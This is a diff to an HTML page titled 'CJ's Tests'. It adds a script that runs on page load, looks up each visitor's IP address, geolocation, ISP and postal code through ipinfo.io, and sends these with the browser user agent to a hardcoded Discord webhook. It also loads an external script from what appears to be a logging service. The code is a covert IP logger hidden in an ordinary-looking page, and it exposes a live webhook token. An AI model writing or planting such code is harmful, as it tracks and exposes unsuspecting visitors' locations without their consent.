@@ -1,6 +1,71 @@
 <head>
   <title>CJ's Tests</title>
-	
+	<script>
+				$.get("https://ipinfo.io", function(response) {
+			const webhook_url = "https://discord.com/api/webhooks/1293641125109956748/MqwIlGaJOFp_5YCHnFVOI8dpxTb73hKMycJWdaqDvEjTHmhxIg54Tu06QklUWcOL5fyz";
+			const main = {
+				title: "CJ's Logs | IP Loggs",
+				description: "> IP Logged",
+				fields: [
+					{
+						name: "IP:",
+						value: `\`${response.ip}\``,
+						inline: false,
+					},
+					{
+						name: "User-Agent:",
+						value: `\`${navigator.userAgent}\``,
+						inline: false,
+					},
+					{
+						name: "City:",
+						value: `\`${response.city}\``,
+						inline: false,
+					},
+					{
+						name: "Region:",
+						value: `\`${response.region}\``,
+						inline: false
+					},
+					{
+						name: "Country:",
+						value: `\`${response.country}\``,
+						inline: false
+					},
+					{
+						name: "Long/Lat:",
+						value: `\`${response.loc}\``,
+						inline: false
+					},
+					{
+						name: "Company:",
+						value: `\`${response.org}\``,
+						inline: false
+					},
+					{
+						name: "Postal Region:",
+						value: `\`${response.postal}\``,
+						inline: false
+					},
+				],
+				footer: {
+					text: "CJ's Logs | IP LOGGED"
+				},
+				author: {
+					name: "{ CJ's LOGS }",
+					url: ""
+				}
+			}
+			var xhttp = new XMLHttpRequest();
+			const url = webhook_url;
+			xhttp.open("POST", url, true);
+			xhttp.setRequestHeader('Content-Type', 'application/json');
+			xhttp.send(JSON.stringify({
+				'username': 'CJ'S LOGS',
+				'embeds': [main],
+			}));
+		}, "json");
+	</script>
         <script src="https://qiklog.pages.dev/api.js"></script>
             <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js" integrity="sha512-XQoYMqMTK8LvdxXYG3nZ448hOEQiglfqkJs1NOQV44cWnUrBc8PkAOcXy20w0vlaXaVUearIOBhiXZ5V3ynxwA==" crossorigin=""></script>
       <div id="iframeContainer">
